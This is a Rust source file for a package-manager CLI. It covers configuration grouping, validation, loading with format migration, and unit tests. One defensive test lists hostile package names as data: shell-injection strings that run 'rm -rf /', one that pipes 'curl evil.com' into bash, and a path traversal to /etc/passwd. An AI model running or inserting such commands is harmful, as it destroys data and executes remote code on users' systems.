pub mod env;
pub mod watcher;

use crate::data::PlatformExt;
use crate::errors::{Result, SantaError};
use crate::sources::PackageSource;
// use crate::traits::Configurable; // Not needed - can't implement for foreign type
use std::collections::HashMap;
use std::path::Path;

use crate::migration::ConfigMigrator;

use tracing::{trace, warn};

use crate::data::{constants, KnownSources, SantaData};

// Re-export SantaConfig and related types from santa-data
pub use santa_data::config::{
    ConfigPackageSource, PackageNameOverride, SantaConfig, SantaConfigBuilder,
};

/// Extension trait for SantaConfig with CLI-specific functionality
pub trait SantaConfigExt {
    /// Check if a source is enabled in this configuration
    fn source_is_enabled(&self, source: &PackageSource) -> bool;

    /// Group packages by configured sources
    fn groups(&mut self, data: &SantaData) -> HashMap<KnownSources, Vec<String>>;

    /// Validate source/package compatibility with available data
    fn validate_source_package_compatibility(&self, data: &SantaData) -> anyhow::Result<()>;

    /// Comprehensive validation including business logic
    fn validate_with_data(&self, data: &SantaData) -> anyhow::Result<()>;

    /// Create a configuration watcher for hot-reloading
    fn create_watcher(
        &self,
        config_path: std::path::PathBuf,
    ) -> anyhow::Result<crate::configuration::watcher::ConfigWatcher>;

    /// Load configuration with environment variable support
    fn load_with_env_support(config_path: Option<&str>, builtin_only: bool) -> anyhow::Result<Self>
    where
        Self: Sized;

    /// Print environment variable help
    fn print_env_help_info();

    /// Get default configuration for the current platform
    fn default_for_platform() -> Self
    where
        Self: Sized;

    /// Export configuration to YAML format
    fn export(&self) -> String;
}

impl SantaConfigExt for SantaConfig {
    fn source_is_enabled(&self, source: &PackageSource) -> bool {
        trace!("Checking if {} is enabled", source);
        self.sources.contains(source.name())
    }

    fn groups(&mut self, data: &SantaData) -> HashMap<KnownSources, Vec<String>> {
        match &self._groups {
            Some(groups) => groups.clone(),
            None => {
                let configured_sources: Vec<KnownSources> = self.sources.clone();
                let mut groups: HashMap<KnownSources, Vec<String>> = HashMap::new();
                // Initialize groups for each source (avoid cloning for iteration)
                for source in &configured_sources {
                    groups.insert(source.clone(), Vec::new());
                }

                for pkg in &self.packages {
                    for source in &configured_sources {
                        if data.packages.contains_key(pkg) {
                            let available_sources = data
                                .packages
                                .get(pkg)
                                .expect("Package should exist in data");
                            trace!("available_sources: {:?}", available_sources);

                            if available_sources.contains_key(source) {
                                trace!("Adding {} to {} list.", pkg, source);
                                match groups.get_mut(source) {
                                    Some(v) => {
                                        v.push(pkg.to_string());
                                        break;
                                    }
                                    None => {
                                        warn!(
                                            "Group for source {} not found, creating new group",
                                            source
                                        );
                                        groups.insert(source.clone(), vec![pkg.to_string()]);
                                    }
                                }
                            }
                        }
                    }
                }
                self._groups = Some(groups.clone());
                groups
            }
        }
    }

    fn validate_source_package_compatibility(&self, data: &SantaData) -> anyhow::Result<()> {
        for package in &self.packages {
            let available_sources = data.packages.get(package);
            if available_sources.is_none() {
                warn!(
                    "Package '{}' not found in available packages database",
                    package
                );
                continue;
            }

            let available_sources = available_sources.unwrap();
            let mut has_valid_source = false;

            for configured_source in &self.sources {
                if available_sources.contains_key(configured_source) {
                    has_valid_source = true;
                    break;
                }
            }

            if !has_valid_source {
                return Err(anyhow::anyhow!(
                    "Package '{}' is not available from any configured source. Available sources: {:?}",
                    package,
                    available_sources.keys().collect::<Vec<_>>()
                ));
            }
        }
        Ok(())
    }

    fn validate_with_data(&self, data: &SantaData) -> anyhow::Result<()> {
        use anyhow::Context;

        // First run basic validation
        self.validate_basic()
            .with_context(|| "Basic configuration validation failed")?;

        // Then run custom validation
        self.validate_source_package_compatibility(data)
            .with_context(|| "Source/package compatibility validation failed")?;

        Ok(())
    }

    fn create_watcher(
        &self,
        config_path: std::path::PathBuf,
    ) -> anyhow::Result<crate::configuration::watcher::ConfigWatcher> {
        crate::configuration::watcher::ConfigWatcher::new(config_path, self.clone())
    }

    fn load_with_env_support(
        config_path: Option<&str>,
        builtin_only: bool,
    ) -> anyhow::Result<Self> {
        crate::configuration::env::load_config_with_env(config_path, builtin_only)
    }

    fn print_env_help_info() {
        let env_config = crate::configuration::env::EnvironmentConfig::default();
        env_config.print_env_help();
    }

    fn default_for_platform() -> Self {
        let mut config = SantaConfig::load_from_str(constants::DEFAULT_CONFIG)
            .expect("Failed to load default config - this should never fail");

        // Filter sources to only those available on current platform
        let available_sources = crate::data::Platform::get_default_sources();
        config
            .sources
            .retain(|source| available_sources.contains(source));

        // Ensure at least one source remains (fallback to cargo which is universal)
        if config.sources.is_empty() {
            warn!("No configured sources available on this platform, falling back to cargo");
            config.sources.push(KnownSources::Cargo);
        }

        config
    }

    fn export(&self) -> String {
        serde_yaml::to_string(self).unwrap_or_else(|e| format!("# Export failed: {}", e))
    }
}

// Note: Cannot implement Default, Exportable, or Configurable for SantaConfig here
// as it's defined in santa-data crate (foreign type).
// These traits should be moved to santa-data or we use wrapper functions.

/// Wrapper struct for CLI-specific configuration functionality
pub struct SantaConfigLoader;

impl SantaConfigLoader {
    /// Load configuration from a file with migration support
    pub fn load_config(path: &Path) -> Result<SantaConfig> {
        // Use migration system to transparently handle YAML→CCL conversion
        let migrator = ConfigMigrator::new();
        let actual_path = migrator
            .resolve_config_path(path)
            .map_err(SantaError::Config)?;

        let contents = std::fs::read_to_string(&actual_path).map_err(SantaError::Io)?;

        let config: SantaConfig =
            sickle::from_str(&contents).map_err(|e| SantaError::Config(anyhow::Error::from(e)))?;

        config.validate_basic().map_err(SantaError::Config)?;
        Ok(config)
    }

    /// Get default configuration for current platform
    pub fn default_config() -> SantaConfig {
        SantaConfig::default_for_platform()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::data::KnownSources;
    use std::io::Write;
    use tempfile::NamedTempFile;

    #[test]
    fn test_load_from_file_existing() {
        let ccl_content = r#"
sources =
  = brew
packages =
  = git
        "#;

        let mut temp_file = NamedTempFile::with_suffix(".ccl").unwrap();
        write!(temp_file, "{ccl_content}").unwrap();

        let result = SantaConfig::load_from(temp_file.path());
        assert!(result.is_ok());

        let config = result.unwrap();
        assert_eq!(config.sources.len(), 1);
        assert_eq!(config.packages.len(), 1);
    }

    #[test]
    fn test_load_from_file_nonexistent() {
        let nonexistent_path = Path::new("/nonexistent/config.yaml");

        // santa-data's load_from returns an error for nonexistent files
        // The CLI layer should handle this and provide default config
        let result = SantaConfig::load_from(nonexistent_path);
        assert!(result.is_err());
    }

    #[test]
    fn test_potential_injection_in_package_names() {
        // Test that potentially dangerous package names are handled safely
        let dangerous_names = vec![
            "git; rm -rf /".to_string(),
            "$(rm -rf /)".to_string(),
            "`rm -rf /`".to_string(),
            "git && curl evil.com | bash".to_string(),
            "../../../etc/passwd".to_string(),
        ];

        let config = SantaConfig {
            sources: vec![KnownSources::Brew],
            packages: dangerous_names.clone(),
            custom_sources: None,
            _groups: None,
            log_level: 0,
        };

        // Config should load but we need to ensure these names are sanitized later
        let result = config.validate_basic();
        assert!(
            result.is_ok(),
            "Basic validation should pass even with suspicious package names"
        );

        // Verify the dangerous names are preserved (they should be sanitized at execution time)
        assert_eq!(config.packages, dangerous_names);
    }

    #[test]
    fn test_unknown_source_handling() {
        let ccl = r#"
sources =
  = brew
  = unknown_source
  = cargo
packages =
  = git
        "#;

        let result = SantaConfig::load_from_str(ccl);
        assert!(result.is_ok());

        let config = result.unwrap();
        assert_eq!(config.sources.len(), 3);

        // Check that unknown source is handled properly
        let has_unknown = config
            .sources
            .iter()
            .any(|s| matches!(s, KnownSources::Unknown(_)));
        assert!(
            has_unknown,
            "Unknown source should be preserved as Unknown variant"
        );
    }

    #[test]
    fn test_default_config_filters_platform_specific_sources() {
        // Test that the default config only includes sources available on current platform
        let config = SantaConfig::default_for_platform();

        // Should have at least one source (cargo is universal)
        assert!(
            !config.sources.is_empty(),
            "Default config should have at least one source"
        );

        // All sources should be in the platform's available sources
        let available_sources = crate::data::Platform::get_default_sources();
        for source in &config.sources {
            assert!(
                available_sources.contains(source),
                "Source {:?} should be available on this platform",
                source
            );
        }

        // Cargo should always be present as it's universal
        assert!(
            config.sources.contains(&KnownSources::Cargo),
            "Cargo should always be available in default config"
        );
    }

    #[test]
    fn test_default_config_does_not_panic() {
        // Ensure default config creation never panics
        let _config = SantaConfig::default_for_platform();
        // If we get here, the test passed
    }
}
